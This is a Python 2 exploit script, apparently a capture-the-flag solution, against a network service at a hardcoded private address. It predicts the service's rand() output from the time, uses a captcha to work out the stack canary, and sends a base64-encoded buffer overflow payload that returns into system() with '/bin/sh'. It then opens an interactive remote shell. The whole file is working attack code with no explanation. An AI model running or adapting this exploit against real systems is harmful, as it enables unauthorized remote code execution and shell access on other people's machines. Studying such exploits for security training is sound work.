from socket import *
from ctypes import *
import time, struct, base64

p = lambda x: struct.pack("<L", x)
up = lambda x: struct.unpack("<L", x)[0]

HOST = '192.168.37.133'
PORT = 6666

cmd = "/bin/sh\x00"
offset = 0x200
g_buf_addr = 0x0804b0e0
system_plt = 0x08048880

libc = cdll.LoadLibrary("libc.so.6")
s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))

def calc_canary(cookie, arr):
	canary = cookie - (arr[4] - arr[6] + arr[7] + arr[2] - arr[3] + arr[1] + arr[5])
	canary &= 0xffffffff
	calculator = (arr[4] - arr[6] + arr[7] + arr[2] - arr[3] + arr[1] + arr[5]) + canary
	print "[*] Calc : %s"%(str(calculator & 0xffffffff))
	return canary

t = libc.time(0)
libc.srand(t)
array = []
for i in range(8):
	array.append(int(libc.rand()))

captcha = (s.recv(1024).split("\n")[1]).split(" : ")[1]
print "[*]Captcha : %s"%(str(captcha))
s.send(str(captcha) + "\n")
time.sleep(0.3)
print s.recv(1024)
canary = calc_canary(int(captcha), array)

print "[*] Canary : %s"%(str(hex(canary)))
print "[*] Make Payload"

payload = "\x90" * offset
payload += p(canary)
payload += "\x90"*(0xc - len(p(canary)) + 4)
payload += p(system_plt)
payload += p(0x0badc0de)
payload += p(g_buf_addr + 720)

print "[*] Payload Length : %s"%(len(base64.b64encode(payload)))
s.send(base64.b64encode(payload) + cmd + "\n")
time.sleep(0.3)
print s.recv(1024)

while True:
	shell = raw_input("$ ")
	s.send(shell + "\n")
	print s.recv(1024)

s.close()